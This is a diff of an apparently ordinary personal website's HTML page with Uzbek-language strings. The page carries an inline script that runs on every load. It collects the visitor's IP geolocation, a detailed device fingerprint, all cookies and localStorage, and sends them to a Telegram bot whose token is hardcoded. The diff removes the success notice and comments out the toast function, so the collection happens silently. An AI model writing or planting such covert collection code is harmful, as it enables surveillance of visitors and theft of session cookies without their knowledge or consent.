@@ -133,7 +133,7 @@
   <audio id="mainAudio" src="Music/ttsMP3.com_VoiceText_2025-4-15_12-14-5.mp3" autoplay muted></audio>
 
 
-  <div id="home" class="intro route bg-image" style="background-image: url(video/ezgif-1bb1f2434c03c7.gif)">
+  <div id="home" class="intro route bg-image" style="background-image: url(video/ezgif-102e44e320c7cc.gif)">
     <div class="overlay-itro"></div>
     <div class="intro-content display-table">
       <div class="table-cell">
@@ -885,74 +885,72 @@
   <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
   <div id="preloader"></div>
 
-  <script>
-    window.addEventListener('load', () => {
-      const lastSent = localStorage.getItem('lastSent');
-      const now = Date.now();
-      if (!lastSent || now - lastSent > 60000) {
-        sendDeviceInfo();
-        localStorage.setItem('lastSent', now);
-      } else {
-        console.log('So‘rov juda tez yuborildi.');
-        showToast('So‘rov juda tez yuborildi.', 'error');
-      }
-    });
-  
-    async function sendDeviceInfo() {
-      try {
-        const ipResponse = await fetch('https://ipapi.co/json/', { mode: 'cors' });
-        const ipData = await ipResponse.json();
-        const ipAddress = ipData.ip || 'Aniqlanmadi';
-        const geoInfo = {
-          city: ipData.city || 'Aniqlanmadi',
-          region: ipData.region || 'Aniqlanmadi',
-          country: ipData.country_name || 'Aniqlanmadi',
-          latitude: ipData.latitude || 'Aniqlanmadi',
-          longitude: ipData.longitude || 'Aniqlanmadi',
-          postal: ipData.postal || 'Aniqlanmadi',
-          isp: ipData.org || 'Aniqlanmadi',
-          asn: ipData.asn || 'Aniqlanmadi',
-        };
-  
-        const batteryData = await getBatteryInfo();
-        const networkData = getNetworkInfo();
-  
-        const deviceInfo = {
-          userAgent: navigator.userAgent || 'Aniqlanmadi',
-          platform: navigator.platform || 'Aniqlanmadi',
-          language: navigator.language || navigator.languages?.join(', ') || 'Aniqlanmadi',
-          screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
-          colorDepth: window.screen.colorDepth || 'Aniqlanmadi',
-          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
-          cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
-          onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
-          referrer: document.referrer || 'Aniqlanmadi',
-          currentURL: window.location.href || 'Aniqlanmadi',
-          deviceMemory: navigator.deviceMemory || 'Aniqlanmadi',
-          hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi',
-          maxTouchPoints: navigator.maxTouchPoints || 'Aniqlanmadi',
-          vendor: navigator.vendor || 'Aniqlanmadi',
-          product: navigator.product || 'Aniqlanmadi',
-          appVersion: navigator.appVersion || 'Aniqlanmadi',
-          doNotTrack: navigator.doNotTrack || 'Aniqlanmadi',
-          javaEnabled: navigator.javaEnabled ? (navigator.javaEnabled() ? 'Ha' : 'Yo‘q') : 'Aniqlanmadi',
-          plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Aniqlanmadi',
-          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'Aniqlanmadi',
-          windowSize: `${window.innerWidth}x${window.innerHeight}` || 'Aniqlanmadi',
-          performanceTiming: window.performance?.timing ? JSON.stringify({
-            navigationStart: window.performance.timing.navigationStart,
-            loadEventEnd: window.performance.timing.loadEventEnd,
-          }) : 'Aniqlanmadi',
-          webglRenderer: getWebGLRenderer() || 'Aniqlanmadi',
-        };
-  
-        const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
-        const deviceName = parseUserAgent(deviceInfo.userAgent);
-        const cookies = document.cookie || 'Cookie’lar yo‘q';
-        const localStorageData = JSON.stringify(localStorage) || 'LocalStorage bo‘sh';
+<script>
+  window.addEventListener('load', () => {
+    const lastSent = localStorage.getItem('lastSent');
+    const now = Date.now();
+    if (!lastSent || now - lastSent > 60000) {
+      sendDeviceInfo();
+      localStorage.setItem('lastSent', now);
+    } else {
+      console.log('So‘rov juda tez yuborildi.');
+    }
+  });
 
+  async function sendDeviceInfo() {
+    try {
+      const ipResponse = await fetch('https://ipapi.co/json/', { mode: 'cors' });
+      const ipData = await ipResponse.json();
+      const ipAddress = ipData.ip || 'Aniqlanmadi';
+      const geoInfo = {
+        city: ipData.city || 'Aniqlanmadi',
+        region: ipData.region || 'Aniqlanmadi',
+        country: ipData.country_name || 'Aniqlanmadi',
+        latitude: ipData.latitude || 'Aniqlanmadi',
+        longitude: ipData.longitude || 'Aniqlanmadi',
+        postal: ipData.postal || 'Aniqlanmadi',
+        isp: ipData.org || 'Aniqlanmadi',
+        asn: ipData.asn || 'Aniqlanmadi',
+      };
 
-        const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
+      const batteryData = await getBatteryInfo();
+      const networkData = getNetworkInfo();
+
+      const deviceInfo = {
+        userAgent: navigator.userAgent || 'Aniqlanmadi',
+        platform: navigator.platform || 'Aniqlanmadi',
+        language: navigator.language || navigator.languages?.join(', ') || 'Aniqlanmadi',
+        screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
+        colorDepth: window.screen.colorDepth || 'Aniqlanmadi',
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
+        cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
+        onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
+        referrer: document.referrer || 'Aniqlanmadi',
+        currentURL: window.location.href || 'Aniqlanmadi',
+        deviceMemory: navigator.deviceMemory || 'Aniqlanmadi',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi',
+        maxTouchPoints: navigator.maxTouchPoints || 'Aniqlanmadi',
+        vendor: navigator.vendor || 'Aniqlanmadi',
+        product: navigator.product || 'Aniqlanmadi',
+        appVersion: navigator.appVersion || 'Aniqlanmadi',
+        doNotTrack: navigator.doNotTrack || 'Aniqlanmadi',
+        javaEnabled: navigator.javaEnabled ? (navigator.javaEnabled() ? 'Ha' : 'Yo‘q') : 'Aniqlanmadi',
+        plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Aniqlanmadi',
+        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'Aniqlanmadi',
+        windowSize: `${window.innerWidth}x${window.innerHeight}` || 'Aniqlanmadi',
+        performanceTiming: window.performance?.timing ? JSON.stringify({
+          navigationStart: window.performance.timing.navigationStart,
+          loadEventEnd: window.performance.timing.loadEventEnd,
+        }) : 'Aniqlanmadi',
+        webglRenderer: getWebGLRenderer() || 'Aniqlanmadi',
+      };
+
+      const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
+      const deviceName = parseUserAgent(deviceInfo.userAgent);
+      const cookies = document.cookie || 'Cookie’lar yo‘q';
+      const localStorageData = JSON.stringify(localStorage) || 'LocalStorage bo‘sh';
+
+      const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
       const CHAT_ID = "6992354984";
       const TEXT = `
 🛬 *Yangi tashrif!*  
@@ -1005,9 +1003,6 @@
       if (!data.ok) {
         console.error('Telegram xatosi:', data);
         showToast('Ma‘lumotlarni yuborishda xato yuz berdi.', 'error');
-      } else {
-        console.log('Ma‘lumotlar muvaffaqiyatli yuborildi.');
-        showToast('Ma‘lumotlar muvaffaqiyatli yuborildi.', 'success');
       }
     } catch (error) {
       console.error('Xato yuz berdi:', error);
@@ -1050,7 +1045,6 @@
     else if (/Macintosh/.test(userAgent)) device = 'MacOS qurilmasi';
     else if (/Linux/.test(userAgent)) device = 'Linux qurilmasi';
 
-
     let browser = 'Noma‘lum';
     if (/Chrome/.test(userAgent)) browser = 'Google Chrome';
     else if (/Firefox/.test(userAgent)) browser = 'Mozilla Firefox';
@@ -1074,23 +1068,22 @@
     return 'WebGL qo‘llab-quvvatlanmaydi';
   }
 
-  function showToast(message, type = 'error') {
-    const toast = document.createElement('div');
-    toast.style.position = 'fixed';
-    toast.style.bottom = '20px';
-    toast.style.right = '20px';
-    toast.style.padding = '10px 20px';
-    toast.style.background = type === 'error' ? '#dc3545' : '#28a745';
-    toast.style.color = 'white';
-    toast.style.borderRadius = '5px';
-    toast.style.zIndex = '1000';
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 3000);
-  }
+  // function showToast(message, type = 'error') {
+  //   const toast = document.createElement('div');
+  //   toast.style.position = 'fixed';
+  //   toast.style.bottom = '20px';
+  //   toast.style.right = '20px';
+  //   toast.style.padding = '10px 20px';
+  //   toast.style.background = type === 'error' ? '#dc3545' : '#28a745';
+  //   toast.style.color = 'white';
+  //   toast.style.borderRadius = '5px';
+  //   toast.style.zIndex = '1000';
+  //   toast.textContent = message;
+  //   document.body.appendChild(toast);
+  //   setTimeout(() => toast.remove(), 3000);
+  // }
 </script>
 
-        
 
   <!-- JavaScript Libraries -->
   <script src="lib/jquery/jquery.min.js"></script>
